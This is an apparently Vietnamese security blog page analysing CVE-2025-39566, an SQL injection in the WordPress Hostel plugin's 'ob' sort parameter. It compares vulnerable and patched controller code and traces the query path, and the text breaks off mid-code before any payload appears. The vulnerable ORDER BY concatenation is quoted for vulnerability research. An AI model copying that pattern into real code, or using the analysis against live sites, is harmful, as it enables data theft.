<!DOCTYPE html>
<html lang="vi">
    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <title>CVE-2025-39566 Analysis &amp; POC - w41bu1</title><meta name="Description" content="Security Vulnerability in WordPress Hostel Plugin."><meta property="og:url" content="http://localhost:1313/vi/2025-08-25-cve-2025-39566/">
  <meta property="og:site_name" content="w41bu1">
  <meta property="og:title" content="CVE-2025-39566 Analysis &amp; POC">
  <meta property="og:description" content="Security Vulnerability in WordPress Hostel Plugin.">
  <meta property="og:locale" content="vi">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2025-09-21T22:27:00+07:00">
    <meta property="article:modified_time" content="2025-09-21T22:27:00+07:00">
    <meta property="article:tag" content="Analyst">
    <meta property="article:tag" content="Plugin">
    <meta property="article:tag" content="Sqli">
    <meta property="og:image" content="http://localhost:1313/logo.png">

  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:image" content="http://localhost:1313/logo.png">
  <meta name="twitter:title" content="CVE-2025-39566 Analysis &amp; POC">
  <meta name="twitter:description" content="Security Vulnerability in WordPress Hostel Plugin.">
<meta name="application-name" content="LoveIt">
<meta name="apple-mobile-web-app-title" content="LoveIt">
<meta name="referrer" content="no-referrer" /><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://localhost:1313/vi/2025-08-25-cve-2025-39566/" /><link rel="prev" href="http://localhost:1313/vi/2025-08-21-wordpress-local-and-debugging/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/css/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "CVE-2025-39566 Analysis \u0026 POC",
        "inLanguage": "vi",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "http:\/\/localhost:1313\/vi\/2025-08-25-cve-2025-39566\/"
        },"image": ["http:\/\/localhost:1313\/images\/Apple-Devices-Preview.png"],"genre": "posts","keywords": "analyst, plugin, sqli","wordcount":  1178 ,
        "url": "http:\/\/localhost:1313\/vi\/2025-08-25-cve-2025-39566\/","datePublished": "2025-09-21T22:27:00+07:00","dateModified": "2025-09-21T22:27:00+07:00","license": "Tác phẩm này được cấp phép theo Giấy phép Creative Commons Ghi công - Phi thương mại 4.0 Quốc tế.","publisher": {
            "@type": "Organization",
            "name": "w41bu1","logo": {
                    "@type": "ImageObject",
                    "url": "http:\/\/localhost:1313\/images\/avatar.jpeg",
                    "width":  736 ,
                    "height":  736 
                }},"author": {
                "@type": "Person",
                "name": "w41bu1"
            },"description": "Security Vulnerability in WordPress Hostel Plugin."
    }
    </script></head>
    <body data-header-desktop="fixed" data-header-mobile="auto"><script>
          const query = window.matchMedia('(prefers-color-scheme: dark)');
          function applyTheme() {
            let theme = window.localStorage?.getItem('theme') || 'auto';
            let isDark = theme === 'dark' || (theme === 'auto' && query.matches);
            document.body.setAttribute('theme', isDark? 'dark' : 'light');
            document.body.setAttribute('cfg-theme', theme);
          }

          applyTheme();
          query.addEventListener('change', applyTheme);
        </script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/vi/" title="w41bu1"><span class="header-title-pre"><i class='fa-solid fa-bug fa-fw' aria-hidden='true'></i></span>w41bu1</a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/vi/posts/"> Posts </a><a class="menu-item" href="/vi/tags/"> Tags </a><a class="menu-item" href="/vi/categories/"> Categories </a><a class="menu-item" href="/vi/categories/documentation/"> Docs </a><a class="menu-item" href="/vi/about/"> About </a><a class="menu-item" href="https://github.com/dillonzq/LoveIt" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw' aria-hidden='true'></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
                        <input type="text" placeholder="Tìm kiếm..." id="search-input-desktop">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Tìm kiếm">
                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Xoá">
                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-desktop">
                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
                        </span>
                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Đổi chủ đề">
                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                </a><a href="javascript:void(0);" class="menu-item language" title="Chọn Ngôn ngữ">
                    <i class="fa fa-globe fa-fw" aria-hidden="true"></i>                      
                    <select class="language-select" id="language-select-desktop" onchange="location = this.value;"><option value="/2025-08-25-cve-2025-39566/">English</option><option value="/vi/2025-08-25-cve-2025-39566/" selected>Vietnamese</option></select>
                </a></div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/vi/" title="w41bu1"><span class="header-title-pre"><i class='fa-solid fa-bug fa-fw' aria-hidden='true'></i></span>w41bu1</a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><div class="search-wrapper">
                    <div class="search mobile" id="search-mobile">
                        <input type="text" placeholder="Tìm kiếm..." id="search-input-mobile">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Tìm kiếm">
                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Xoá">
                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-mobile">
                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
                        </span>
                    </div>
                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
                        Huỷ
                    </a>
                </div><a class="menu-item" href="/vi/posts/" title="">Posts</a><a class="menu-item" href="/vi/tags/" title="">Tags</a><a class="menu-item" href="/vi/categories/" title="">Categories</a><a class="menu-item" href="/vi/categories/documentation/" title="">Docs</a><a class="menu-item" href="/vi/about/" title="">About</a><a class="menu-item" href="https://github.com/dillonzq/LoveIt" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw' aria-hidden='true'></i></a><a href="javascript:void(0);" class="menu-item theme-switch" title="Đổi chủ đề">
                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
            </a><a href="javascript:void(0);" class="menu-item" title="Chọn Ngôn ngữ">
                    <i class="fa fa-globe fa-fw" aria-hidden="true"></i>
                    <select class="language-select" onchange="location = this.value;"><option value="/2025-08-25-cve-2025-39566/">English</option><option value="/vi/2025-08-25-cve-2025-39566/" selected>Vietnamese</option></select>
                </a></div>
    </div>
</header><div class="search-dropdown desktop">
        <div id="search-dropdown-desktop"></div>
    </div>
    <div class="search-dropdown mobile">
        <div id="search-dropdown-mobile"></div>
    </div><main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">Nội dung</h2>
            <div class="toc-content always-active" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">CVE-2025-39566 Analysis & POC</h1><div class="post-meta">
            <div class="post-meta-line"><span class="post-author"><a href="https://w41bu1.github.io" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>w41bu1</a></span>&nbsp;<span class="post-category">trong <a href="/vi/categories/cve-analyst/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>CVE Analyst</a></span></div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2025-09-21">2025-09-21</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1178 từ&nbsp;
                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;6 phút&nbsp;</div>
        </div><div class="featured-image"><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/2025-08-25-cve-2025-39566/app.png"
        data-srcset="/2025-08-25-cve-2025-39566/app.png, /2025-08-25-cve-2025-39566/app.png 1.5x, /2025-08-25-cve-2025-39566/app.png 2x"
        data-sizes="auto"
        alt="/2025-08-25-cve-2025-39566/app.png"
        title="Security Vulnerability in WordPress Hostel Plugin." width="1544" height="500" /></div><div class="details toc" id="toc-static"  data-kept="">
                <div class="details-summary toc-title">
                    <span>Nội dung</span>
                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#background">Background</a></li>
    <li><a href="#exploitation">Exploitation</a>
      <ul>
        <li><a href="#requirements">Requirements</a></li>
        <li><a href="#code-comparison">Code Comparison</a></li>
        <li><a href="#detect-sqli">Detect SQLi</a></li>
        <li><a href="#dump-data-from-database">Dump Data from Database</a></li>
      </ul>
    </li>
    <li><a href="#remediation">Remediation</a></li>
    <li><a href="#takeaways">Takeaways</a></li>
    <li><a href="#references">References</a></li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><hr>
<p>Lỗ hổng trong plugin <strong>Hostel</strong> trước phiên bản <strong>1.1.5.7</strong>. Do dữ liệu đầu vào không được xử lý đúng cách, điều này có thể cho phép kẻ tấn công tương tác trực tiếp với cơ sở dữ liệu, bao gồm nhưng không giới hạn ở việc đánh cắp dữ liệu.</p>
<ul>
<li><strong>CVE ID</strong>: <a href="https://www.cve.org/CVERecord?id=CVE-2025-39566" target="_blank" rel="noopener noreffer ">CVE-2025-39566</a></li>
<li><strong>Product</strong>: <a href="https://wordpress.org/plugins/hostel/" target="_blank" rel="noopener noreffer ">WordPress Hostel Plugin</a></li>
<li><strong>Vulnerability Type</strong>: SQL Injection</li>
<li><strong>Affected Versions</strong>: &lt;= 1.1.5.6</li>
<li><strong>CVSS severity</strong>: 7.6 (High)</li>
<li><strong>Required Privilege</strong>: Administrator</li>
</ul>
<p><strong>Summary</strong>: Plugin Hostel, dùng để quản lý đặt phòng trên WordPress, chứa lỗi SQL Injection tại tham số <code>ob</code> trong phần <strong>Manage Bookings</strong>.</p>
<hr>
<h2 id="background">Background</h2>
<p><strong>Hostel Plugin</strong> cho phép tạo trang web nhà trọ, khách sạn nhỏ hoặc BnB bằng WordPress. Nó cung cấp:</p>
<ul>
<li>Form đặt phòng</li>
<li>Lịch phòng</li>
<li>Quản lý bookings</li>
</ul>
<hr>
<h2 id="exploitation">Exploitation</h2>
<h3 id="requirements">Requirements</h3>
<ul>
<li><a href="https://w41bu1.github.io/posts/wordpress-local-and-debugging/" target="_blank" rel="noopener noreffer "><strong>Local WordPress and Debugging</strong></a></li>
<li><strong>Hostel Plugin</strong>:  v1.1.5.6(vul) và v1.1.5.7(fix)</li>
<li><strong>diff tool</strong>: meld hoặc bất cứ tool nào có thể compare để tháy được sự khác biệt giữa 2 version</li>
</ul>
<h3 id="code-comparison">Code Comparison</h3>
<p>Sử dụng diff tool so sánh sự khác biệt giữa 2 version</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-php">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Sao chép vào bộ nhớ tạm"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;ob&#39;</span><span class="p">]))</span> <span class="p">{</span>					
</span></span><span class="line"><span class="cl">    <span class="nv">$orderby</span> <span class="o">=</span> <span class="s2">&#34;ORDER BY &#34;</span><span class="o">.</span><span class="nx">sanitize_text_field</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;ob&#39;</span><span class="p">])</span> <span class="o">.</span> <span class="s1">&#39; &#39;</span> <span class="o">.</span> <span class="nv">$dir</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
<p>{: file=&ldquo;controlers/bookings.php v1.1.5.6&rdquo;}</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-php">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Sao chép vào bộ nhớ tạm"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;ob&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$ob</span> <span class="o">=</span> <span class="nx">sanitize_text_field</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;ob&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$ob</span><span class="p">,</span> <span class="p">[</span><span class="s1">&#39;tB.id&#39;</span><span class="p">,</span> <span class="s1">&#39;tB.contact_name&#39;</span><span class="p">,</span> <span class="s1">&#39;tB.contact_email&#39;</span><span class="p">,</span> <span class="s1">&#39;tB.from_date&#39;</span><span class="p">,</span> <span class="s1">&#39;tB.amount_paid&#39;</span><span class="p">,</span> <span class="s1">&#39;tB.status&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$ob</span> <span class="o">=</span> <span class="s1">&#39;tB.id&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$orderby</span> <span class="o">=</span> <span class="s2">&#34;ORDER BY </span><span class="si">$ob</span><span class="s2"> </span><span class="si">$dir</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
<p>{: file=&ldquo;controlers/bookings.php v1.1.5.7&rdquo;}</p>
<p>👉 Bản vá sử dụng <strong>whitelist</strong> để giới hạn các cột có thể được sắp xếp, nếu không hợp lệ trả về <code>'tB.id'</code>.</p>
<p><strong>Analysis</strong>: Lỗ hổng xuất hiện khi param <code>ob</code> được truyền trực tiếp vào mệnh đề <code>ORDER BY</code> thông qua hàm <code>sanitize_text_field()</code>, chỉ escape mà không filter SQLi.</p>
<h3 id="detect-sqli">Detect SQLi</h3>
<p>Để inject được, ta cần phải xác định toàn bộ câu query được được sử dụng ở đây</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-php">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Sao chép vào bộ nhớ tạm"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$bookings</span> <span class="o">=</span> <span class="nv">$wpdb</span><span class="o">-&gt;</span><span class="na">get_results</span><span class="p">(</span><span class="s2">&#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM &#34;</span><span class="o">.</span><span class="nx">WPHOSTEL_BOOKINGS</span><span class="o">.</span><span class="s2">&#34; tB JOIN &#34;</span><span class="o">.</span><span class="nx">WPHOSTEL_ROOMS</span><span class="o">.</span><span class="s2">&#34; tR ON tR.id = tB.room_id WHERE is_static=0 </span><span class="si">$where_sql</span><span class="s2"> </span><span class="si">$orderby</span><span class="s2"> </span><span class="si">$limit_sql</span><span class="s2">&#34;</span><span class="p">);</span></span></span></code></pre></div></div>
<p>Cấu query nằm trong nhánh <code>default</code> của cấu trúc <code>switch</code>.</p>
<p>Toàn bộ đoạn xử lý naỳ thuộc về hàm static <code>manage()</code> của class <code>WPHostelBookings</code>.</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-php">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Sao chép vào bộ nhớ tạm"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">WPHostelBookings</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">static</span> <span class="k">function</span> <span class="nf">manage</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">global</span> <span class="nv">$wpdb</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$_booking</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">WPHostelBooking</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">switch</span><span class="p">(</span><span class="o">@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;do&#39;</span><span class="p">])</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">case</span> <span class="s1">&#39;add&#39;</span><span class="o">:</span> <span class="c1">// add handle
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="k">case</span> <span class="s1">&#39;edit&#39;</span><span class="o">:</span> <span class="c1">// edit handle
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="c1">// view/print booking details. Will allow also to confirm/cancel
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="k">case</span> <span class="s1">&#39;view&#39;</span><span class="o">:</span> <span class="c1">// view handle			
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="k">break</span><span class="p">;</span>			
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="c1">// list bookings
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="k">default</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">            <span class="c1">// another logic
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;ob&#39;</span><span class="p">]))</span> <span class="p">{</span>					
</span></span><span class="line"><span class="cl">                <span class="nv">$orderby</span> <span class="o">=</span> <span class="s2">&#34;ORDER BY &#34;</span><span class="o">.</span><span class="nx">sanitize_text_field</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;ob&#39;</span><span class="p">])</span> <span class="o">.</span> <span class="s1">&#39; &#39;</span> <span class="o">.</span> <span class="nv">$dir</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="nv">$bookings</span> <span class="o">=</span> <span class="nv">$wpdb</span><span class="o">-&gt;</span><span class="na">get_results</span><span class="p">(</span><span class="s2">&#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room 
</span></span></span><span class="line"><span class="cl"><span class="s2">            FROM &#34;</span><span class="o">.</span><span class="nx">WPHOSTEL_BOOKINGS</span><span class="o">.</span><span class="s2">&#34; tB JOIN &#34;</span><span class="o">.</span><span class="nx">WPHOSTEL_ROOMS</span><span class="o">.</span><span class="s2">&#34; tR ON tR.id = tB.room_id
</span></span></span><span class="line"><span class="cl"><span class="s2">            WHERE is_static=0 </span><span class="si">$where_sql</span><span class="s2"> </span><span class="si">$orderby</span><span class="s2"> </span><span class="si">$limit_sql</span><span class="s2">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="c1">// another logic
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
<p>Trong WordPress, plugin giao tiếp với core thông qua <strong>Plugin API (Hook System)</strong>. Do đó, để xác định nơi hàm <code>manage()</code> được gọi, ta có thể tìm kiếm từ khóa <code>&quot;manage&quot;</code> trong thư mục chứa plugin.</p>
<p><figure><a class="lightgallery" href="/2025-08-25-cve-2025-39566/search_manage.png" title="search manage()" data-thumbnail="/2025-08-25-cve-2025-39566/search_manage.png" data-sub-html="<h2>Search</h2><p>search manage()</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/2025-08-25-cve-2025-39566/search_manage.png"
            data-srcset="/2025-08-25-cve-2025-39566/search_manage.png, /2025-08-25-cve-2025-39566/search_manage.png 1.5x, /2025-08-25-cve-2025-39566/search_manage.png 2x"
            data-sizes="auto"
            alt="/2025-08-25-cve-2025-39566/search_manage.png" width="631" height="278" />
    </a><figcaption class="image-caption">Search</figcaption>
    </figure></p>
<p>Trong file <code>models/hostel.php</code> ta có hàm:</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-php">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Sao chép vào bộ nhớ tạm"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">class</span> <span class="nx">WPHostel</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// another logic
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="k">static</span> <span class="k">function</span> <span class="nf">menu</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// we use &#39;hostelpro_manage&#39; for consistency with the pro version
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$wphostel_caps</span> <span class="o">=</span> <span class="nx">current_user_can</span><span class="p">(</span><span class="s1">&#39;manage_options&#39;</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;manage_options&#39;</span> <span class="o">:</span> <span class="s1">&#39;hostelpro_manage&#39;</span><span class="p">;</span>     
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nx">add_menu_page</span><span class="p">(</span><span class="nx">__</span><span class="p">(</span><span class="s1">&#39;Hostel&#39;</span><span class="p">,</span> <span class="s1">&#39;wphostel&#39;</span><span class="p">),</span> <span class="nx">__</span><span class="p">(</span><span class="s1">&#39;Hostel&#39;</span><span class="p">,</span> <span class="s1">&#39;wphostel&#39;</span><span class="p">),</span> <span class="nv">$wphostel_caps</span><span class="p">,</span> <span class="s2">&#34;wphostel_options&#34;</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">            <span class="k">array</span><span class="p">(</span><span class="no">__CLASS__</span><span class="p">,</span> <span class="s2">&#34;options&#34;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="nx">add_submenu_page</span><span class="p">(</span><span class="s1">&#39;wphostel_options&#39;</span><span class="p">,</span> <span class="nx">__</span><span class="p">(</span><span class="s1">&#39;Settings&#39;</span><span class="p">,</span> <span class="s1">&#39;wphostel&#39;</span><span class="p">),</span> <span class="nx">__</span><span class="p">(</span><span class="s1">&#39;Settings&#39;</span><span class="p">,</span> <span class="s1">&#39;wphostel&#39;</span><span class="p">),</span> <span class="nv">$wphostel_caps</span><span class="p">,</span> <span class="s2">&#34;wphostel_options&#34;</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">            <span class="k">array</span><span class="p">(</span><span class="no">__CLASS__</span><span class="p">,</span> <span class="s2">&#34;options&#34;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="nx">add_submenu_page</span><span class="p">(</span><span class="s1">&#39;wphostel_options&#39;</span><span class="p">,</span> <span class="nx">__</span><span class="p">(</span><span class="s2">&#34;Manage Rooms&#34;</span><span class="p">,</span> <span class="s1">&#39;wphostel&#39;</span><span class="p">),</span> <span class="nx">__</span><span class="p">(</span><span class="s2">&#34;Manage Rooms&#34;</span><span class="p">,</span> <span class="s1">&#39;wphostel&#39;</span><span class="p">),</span> <span class="nv">$wphostel_caps</span><span class="p">,</span> <span class="s1">&#39;wphostel_rooms&#39;</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;WPHostelRooms&#39;</span><span class="p">,</span> <span class="s2">&#34;manage&#34;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="nx">add_submenu_page</span><span class="p">(</span><span class="s1">&#39;wphostel_options&#39;</span><span class="p">,</span> <span class="nx">__</span><span class="p">(</span><span class="s2">&#34;Manage Bookings&#34;</span><span class="p">,</span> <span class="s1">&#39;wphostel&#39;</span><span class="p">),</span> <span class="nx">__</span><span class="p">(</span><span class="s2">&#34;Manage Bookings&#34;</span><span class="p">,</span> <span class="s1">&#39;wphostel&#39;</span><span class="p">),</span> <span class="nv">$wphostel_caps</span><span class="p">,</span> <span class="s1">&#39;wphostel_bookings&#39;</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;WPHostelBookings&#39;</span><span class="p">,</span> <span class="s2">&#34;manage&#34;</span><span class="p">));</span> 
</span></span><span class="line"><span class="cl">        <span class="nx">add_submenu_page</span><span class="p">(</span><span class="s1">&#39;wphostel_options&#39;</span><span class="p">,</span> <span class="nx">__</span><span class="p">(</span><span class="s2">&#34;Unavailable Dates&#34;</span><span class="p">,</span> <span class="s1">&#39;wphostel&#39;</span><span class="p">),</span> <span class="nx">__</span><span class="p">(</span><span class="s2">&#34;Unavailable Dates&#34;</span><span class="p">,</span> <span class="s1">&#39;wphostel&#39;</span><span class="p">),</span> <span class="nv">$wphostel_caps</span><span class="p">,</span> <span class="s1">&#39;wphostel_unavailable&#39;</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;WPHostelBookings&#39;</span><span class="p">,</span> <span class="s2">&#34;unavailable&#34;</span><span class="p">));</span> 
</span></span><span class="line"><span class="cl">        <span class="nx">add_submenu_page</span><span class="p">(</span><span class="s1">&#39;wphostel_options&#39;</span><span class="p">,</span> <span class="nx">__</span><span class="p">(</span><span class="s2">&#34;Email Log&#34;</span><span class="p">,</span> <span class="s1">&#39;wphostel&#39;</span><span class="p">),</span> <span class="nx">__</span><span class="p">(</span><span class="s2">&#34;Email Log&#34;</span><span class="p">,</span> <span class="s1">&#39;wphostel&#39;</span><span class="p">),</span> <span class="nv">$wphostel_caps</span><span class="p">,</span> <span class="s1">&#39;wphostel_emaillog&#39;</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;WPHostelHelp&#39;</span><span class="p">,</span> <span class="s2">&#34;email_log&#34;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="nx">add_submenu_page</span><span class="p">(</span><span class="s1">&#39;wphostel_options&#39;</span><span class="p">,</span> <span class="nx">__</span><span class="p">(</span><span class="s2">&#34;Help&#34;</span><span class="p">,</span> <span class="s1">&#39;wphostel&#39;</span><span class="p">),</span> <span class="nx">__</span><span class="p">(</span><span class="s2">&#34;Help&#34;</span><span class="p">,</span> <span class="s1">&#39;wphostel&#39;</span><span class="p">),</span> <span class="nv">$wphostel_caps</span><span class="p">,</span> <span class="s1">&#39;wphostel_help&#39;</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;WPHostelHelp&#39;</span><span class="p">,</span> <span class="s2">&#34;index&#34;</span><span class="p">));</span>     
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
